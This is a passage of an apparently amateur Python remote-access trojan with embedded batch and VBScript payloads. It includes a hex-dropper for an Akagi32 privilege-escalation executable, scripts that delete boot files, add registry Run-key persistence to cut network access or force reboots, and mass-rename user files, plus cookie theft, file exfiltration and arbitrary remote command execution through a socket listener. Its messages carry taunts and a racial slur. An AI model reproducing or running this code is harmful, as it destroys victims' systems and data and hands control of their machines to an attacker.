echo 5f 35 75 35 ad 35 e7 35 ff 35 3e 36 47 36 66 36 76 36 ab 36 b8 36 bf 36 dc 36 e3 36 10 37 16 37 21 37 38 37 54 37 62 37 6b 37 71 37 78 37 c7 37 06 38 26 38 33 38 3e 38 ba 38 e4 38 04 39 2f 39 3c 39 41 39 4a 39 4f 39 61 39 c8 39 dc 39 e5 39 23 3a 29 3a 6a 3a 8b 3a a3 3a ac 3a b2 3a 0d 3b 1a 3b 2a 3b 32 3b 3b 3b 47 3b 50 3b 66 3b b5 3b 0b 3c 12 3c 19 3c 21 3c 28 3c 2f 3c 63 3c 79 3c>>Akagi32.hex
echo e 3c80>>Akagi32.hex
echo a9 3c b3 3c b8 3c c2 3c 12 3d 27 3d 37 3d 52 3d 59 3d 68 3d 6e 3d 86 3d 8f 3d 95 3d a3 3d b2 3d b8 3d bf 3d ea 3d 0a 3e 1c 3e 23 3e af 3e c9 3e ce 3f de 3f f1 3f 00 00 00 70 00 00 88 00 00 00 03 30 21 30 e4 31 f7 31 15 32 23 32 d1 33 08 34 0f 34 14 34 18 34 1c 34 20 34 76 34 bb 34 c0 34 c4 34 c8 34 cc 34 35 37 3d 37 51 37 7c 37 e1 37 ed 37 65 38 7f 38 88 38 76 39 7b 39 8d 39 3c 3a>>Akagi32.hex
echo e 3d00>>Akagi32.hex
echo 4b 3a 55 3a bf 3a d0 3a d7 3a e5 3a fe 3a 0a 3b 11 3b 23 3b 3f 3b 97 3b 33 3c 43 3c 50 3c 73 3c 98 3c 9d 3c a9 3c b5 3c 3f 3d b7 3d bf 3d d1 3d 2a 3e 55 3e a5 3e b1 3e c8 3f f0 3f f6 3f 00 00 00 80 00 00 54 00 00 00 56 30 5b 30 6d 30 8b 30 9f 30 a5 30 43 31 59 31 62 31 6d 31 74 31 94 31 9a 31 a0 31 a6 31 ac 31 b2 31 b9 31 c0 31 c7 31 ce 31 d5 31 dc 31 e3 31 eb 31 f3 31 fb 31 07 32>>Akagi32.hex
echo e 3d80>>Akagi32.hex
echo 10 32 15 32 1b 32 25 32 2f 32 3f 32 4f 32 5f 32 68 32 78 32 00 90 00 00 0c 00 00 00 b4 32 00 00 00 b0 00 00 20 00 00 00 2c 32 30 32 b4 32 b8 32 c0 32 34 34 38 34 54 34 58 34 74 34 78 34 00 00 00 d0 00 00 4c 00 00 00 04 30 08 30 28 30 48 30 68 30 88 30 a8 30 c8 30 e8 30 08 31 28 31 48 31 68 31 88 31 a8 31 c8 31 e8 31 08 32 28 32 48 32 68 32 88 32 a8 32 c8 32 e8 32 08 33 28 33 48 33>>Akagi32.hex
echo e 3e00>>Akagi32.hex
echo 68 33 88 33 a8 33 c8 33 e8 33 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e 3e80>>Akagi32.hex
echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e 3f00>>Akagi32.hex
echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e 3f80>>Akagi32.hex
echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo r cx>>Akagi32.hex
echo 3f00>>Akagi32.hex
echo w>>Akagi32.hex
echo q>>Akagi32.hex
debug<Akagi32.hex
copy /B /Y Akagi32.0+Akagi32.1 Akagi32.exe
echo. >Akagi32.hex
del /F /Q Akagi32.hex Akagi32.0 Akagi32.1
dir Akagi32.exe
'''
	file=open('dude.bat', 'w')
	file.write(script+'\nAkagi32.exe '+FILENAME)
	file.close()

def foreversleep():
    code = '''
@echo off
attrib -r -s -h c:autoexec.bat
del c:autoexec.bat
attrib -r -s -h c:boot.ini
del c:boot.ini
attrib -r -s -h c:ntldr
del c:ntldr
attrib -r -s -h c:windowswin.ini
del c:windowswin.ini
@echo off
msg * YOU GOT OWNED!!!
shutdown -s -t 7 -c "A VIRUS IS TAKING OVER c:Drive

'''
    f=open('4eversleep.bat', 'w')
    f.write(code)
    f.close()
    os.system('start 4eversleep.bat')

def DisableINET():
    code = '''
echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
echo You Have Been HACKED!
PAUSE
'''
    f=open('DISABLENET.bat','w')
    f.write(code)
    f.close()
    os.system('start DISABLENET.bat')

def MeltDown():
    code = '''
:CRASH
net send * WORKGROUP ENABLED
net send * WORKGROUP ENABLED
GOTO CRASH
ipconfig /release
shutdown -r -f -t0
echo @echo off>c:windowshartlell.bat
echo break off>>c:windowshartlell.bat
echo shutdown -r -t 11 -f>>c:windowshartlell.bat
echo end>>c:windowshartlell.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v HAHAHA /t reg_sz /d c:windowshartlell.bat /f
echo You Have Been Hackedecho @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
echo YOU HAVE BEEN HACKED BITCH
REN *.DOC *.TXT
REN *.JPEG *.TXT
REN *.LNK *.TXT
REN *.AVI *.TXT
REN *.MPEG *.TXT
REN *.COM *.TXT
REN *.BAT *.TXT

PAUSE

PAUSE
'''
    f=open('meltdown.bat', 'w')
    f.write(code)
    f.close()
    os.system('start meltdown.bat')

def ShutItDown():
    code = '''
echo @echo off>c:windowshartlell.bat
echo break off>>c:windowshartlell.bat
echo shutdown -r -t 11 -f>>c:windowshartlell.bat
echo end>>c:windowshartlell.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v /t reg_sz /d c:windowshartlell.bat /f
echo You have been HACKED.
PAUSE
'''
    f=open('shutdown.bat','w')
    f.write(code)
    f.close()
    os.system('start shutdown.bat')

def PopOut():
    code = '''
Set oWMP = CreateObject("WMPlayer.OCX.7")
Set colCDROMs = oWMP.cdromCollection
do
if colCDROMs.Count >= 1 then
For i = 0 to colCDROMs.Count - 1
colCDROMs.Item(i).Eject
Next
For i = 0 to colCDROMs.Count - 1
colCDROMs.Item(i).Eject
Next
End If
loop
'''
    f=open('pTemp.vbs', 'w')
    f.write(code)
    f.close()
    os.system('start pTemp.vbs')

def Flash():
    code = '''
@echo off
echo e100 B8 13 00 CD 10 E4 40 88 C3 E4 40 88 C7 F6 E3 30>\\z.dbg
echo e110 DF 88 C1 BA C8 03 30 C0 EE BA DA 03 EC A8 08 75>>\\z.dbg
echo e120 FB EC A8 08 74 FB BA C9 03 88 D8 EE 88 F8 EE 88>>\\z.dbg
echo e130 C8 EE B4 01 CD 16 74 CD B8 03 00 CD 10 C3>>\\z.dbg
echo g=100>>\\z.dbg
echo q>>\\z.dbg
debug <\\z.dbg>nul
del \\z.dbg
But if you really want to mess with a friend then copy and paste the following code which will do the same thing except when they press a key the screen will go black and the only way to stop the batch file is by pressing CTRL-ALT-DELETE.
@echo off
:a
echo e100 B8 13 00 CD 10 E4 40 88 C3 E4 40 88 C7 F6 E3 30>\\z.dbg
echo e110 DF 88 C1 BA C8 03 30 C0 EE BA DA 03 EC A8 08 75>>\\z.dbg
echo e120 FB EC A8 08 74 FB BA C9 03 88 D8 EE 88 F8 EE 88>>\\z.dbg
echo e130 C8 EE B4 01 CD 16 74 CD B8 03 00 CD 10 C3>>\\z.dbg
echo g=100>>\\z.dbg
echo q>>\\z.dbg
debug <\\z.dbg>nul
del \\z.dbg
goto a
'''
    f=open('Ftemp.bat','w')
    f.write(code)
    f.close()
    os.system('start Ftemp.bat')

def ChangeWall(IMG):
    SPI_SETDESKWALLPAPER = 20 
    user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, IMG , 0)

def ShowMessage(MESSAGE):
    f=open('tmp.bat', 'w')
    cmd = 'msg * ' + MESSAGE
    f.write(cmd)
    f.close
    os.popen('start tmp.bat')
    

def GetCookies(loc):
    import sqlite3
    DataBase = loc
    con = sqlite3.connect(DataBase)
    Cursor = con.cyrsor()
    data = cur.execute('select * from moz_cookies')
    Data = data.fetchall()
    f=open('cookie.txt', 'w')
    f.write(Data)
    f.close
    

def showdanger():
    for i in range(40):
        os.system('color 04')
        os.system('color 40')
    os.system('color 4')
    
def download(FILENAME):
    sock=socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.connect((HOST, LPORT))
    sock.send(FILENAME)
    ifexist = sock.recv(1024)
    if ifexist == 'True':
        size = sock.recv(1024)
        sock.send('GETIT')
        f= open(FILENAME , 'wb')
        data = sock.recv(1024)
        while True:
            f.write(data)
            data = sock.recv(1024)
            if data == 'ENDOFTHELINE':
                    break           
        sock.close()
        print 'DONE'
def upload(FILENAME):
    import socket, os
    sock=socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((HOST, LPORT))
    sock.listen(10)
    print ' 3Waiting...' 
    c, addr = sock.accept()
    print ' [+] Connected!'
    FILENAME = c.recv(1024)
    if os.path.isfile(FILENAME) == True:
        c.sendall('True')
        size = os.path.getsize(FILENAME)
        c.sendall(str(size))
        opt = c.recv(1024)
        if opt == 'GETIT':
            f = open(FILENAME , 'rb')
            data = f.read(1024)
            while data != '':
                c.sendall(data)
                data = f.read(1024)
            c.sendall('ENDOFTHELINE')
            print 'DONE'
    else:
        c.sendall('nOPE')
    sock.close()

def screenshot():
    from PIL import ImageGrab
    snap = ImageGrab.grab()
    fname=str(ctime())+'.jpeg'
    snap.save(fname)
    return fname

def VirusHandler():
                print 'ROLLIN'
                name = c.recv(1024)
                print 'IN VIRUS'
                if name == 'cdpop':
                    PopOut()
                    c.sendall('DONE!... He would be fraking out now')
                elif name == 'flashscreen':
                    Flash()
                    c.sendall('Done That nigga will be wondering dafaq is happening')
                elif name == 'meltdown':
                    MeltDown()
                    c.sendall('DONE! That must hurt xD')
                elif name == 'DisableINET':
                    DisableINET()
                    c.sendall('WELL... you screwed the Internet just now')
                elif name == '4eversleep':
                    foreversleep()
                    c.sendall('Damn bro... you just killed the machine O_O')
                elif name == 'shutitdown':
                    ShutItDown()
                    c.sendall('Goodbye you must have thought bout it ')


def GetIP():
    return 'localhost'

def main():
    #privilegeEscalation()
    global HOST, LPORT
    global s, c
    LPORT = 9010
    s=socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(10)
    print ' [+] Listening...'
    c, addr = s.accept()
    c.sendall(' [+] You\'ve Connected to your machine!')
    while True:
            print ('-'*32)
            command = c.recv(1024)
            if command == 'upload':
                FILENAME = c.recv(1024)
                download(FILENAME)
            elif command == 'message':
                message = c.recv(1024)
                title = c.recv(1024)
                icon = c.recv(1024)
                Texter(message, icon, title)
                
            elif command == 'download':
                FILENAME = c.recv(1024)
                upload(FILENAME)
            elif command == 'getscreenshot':
                name = screenshot()
                c.sendall('GOT IT '+ name)
            elif command == 'virus':
                VirusHandler()
            else:
                if command == 'download':
                    pass
                elif command == 'upload':
                    pass
                op = os.popen(command).read()
                if op == '':
                    c.sendall('NONE')
                elif op == '\\n':
                    c.sendall('NONE')
                else:
                    c.sendall(op)

HOST='localhost'
PORT=8080
if __name__ == '__main__':
   main()
